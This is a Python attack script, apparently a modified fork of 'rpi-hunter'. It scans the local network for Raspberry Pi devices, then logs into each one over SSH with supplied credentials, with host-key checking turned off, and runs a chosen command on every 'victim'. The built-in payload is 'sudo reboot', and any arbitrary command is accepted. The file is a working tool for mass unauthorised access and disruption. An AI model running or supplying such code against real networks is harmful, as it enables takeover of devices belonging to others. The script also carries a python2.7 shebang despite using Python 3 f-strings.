#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
### ORIGINAL CODE BY BUSESCANFLY, MODIFIED BY TEAM ###
import os
import argparse
from termcolor import colored, cprint
import os

payloads={
	'reboot': 'sudo reboot',
}

# List available payloads.
def list_payloads():
	l=0
	cprint("Payloads:", "green")
	print(colored("Specify with --payload", "green"), colored("name\n", "yellow"))
	for key,value in payloads.items():
		print(colored(f"[{key}]", "yellow"), colored(value, "white"))
	print('\n')

# Scans the network for Raspberry Pi's.
def scan():
	main_directory = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
	scan_dir = os.path.join(main_directory, "scan")
 
	os.system(f"sudo arp-scan -I en0 -g --localnet -W {os.path.join(scan_dir, 'scan.pcap')}")
	os.system(f"tshark -r {os.path.join(scan_dir, 'scan.pcap')} > {os.path.join(scan_dir, 'pcap.txt')} 2>/dev/null")
	os.system(f"cat {os.path.join(scan_dir, 'pcap.txt')} | grep -i \"rasp\" > {os.path.join(scan_dir, 'raspi_list')}")
	os.system(f"awk '{{print $8}}' {os.path.join(scan_dir, 'raspi_list')} > {os.path.join(scan_dir, 'rpi_list')}")
	os.system(f"rm -rf {os.path.join(scan_dir, 'scan.pcap')} && rm -rf {os.path.join(scan_dir, 'pcap.txt')} && rm -rf {os.path.join(scan_dir, 'raspi_list')}")
	
	with open(os.path.join(scan_dir, 'rpi_list')) as inf:
		ip_list = [line.strip() for line in inf]
	return ip_list

# Send payload to Pi's.
# Requires a list of IP's, a username, credentials (password), and the payload.
def rpi(ip_list, user, creds, payload):
	cprint(f"Loaded {str(len(ip_list))} IP(s)", "yellow")

	cprint(f"Loaded payload: {payload}", "green")
	cprint("Beginning to send payload to Pi's...", "blue")

	for ip in ip_list:
		print(f"{colored('Sending payload to victim', 'yellow')} {colored(ip, 'red')}")
		print("\n")
		print(f"Output from {ip}:")
		os.system(f"sshpass -p \"{creds}\" ssh -o stricthostkeychecking=no {user}@{ip} {payload}")
		print("\n")

# Prints the introduction message, originally inserted BusesCanFly.
# Kept (but updated) for the their sake!
def intro():
	print('\n')
	cprint("                        NETWORK BUSTER 'N' RPI-HUNTER                        ", "red")
	cprint("-----------------------------------------------------------------------------", "yellow")
	cprint("            Originally by BusesCanFly, Forked & Modified by Team             ", "blue")
	cprint("-----------------------------------------------------------------------------", "yellow")
	print('\n')

# Main function for rpi-hunter.
# If args.list is True, it will list available payloads.
# Otherwise, scan the network for Raspberry Pi's and send a payload to them.
def let_the_hunt_begin(args):
    
	if args.payload in payloads:
		payload=payloads[args.payload]
	else:
		payload=args.payload
  
	[user, creds] = [args.user, args.creds]
    
	intro()

	if args.list:
		list_payloads()
	else:
		rpi(scan(), user, creds, payload)
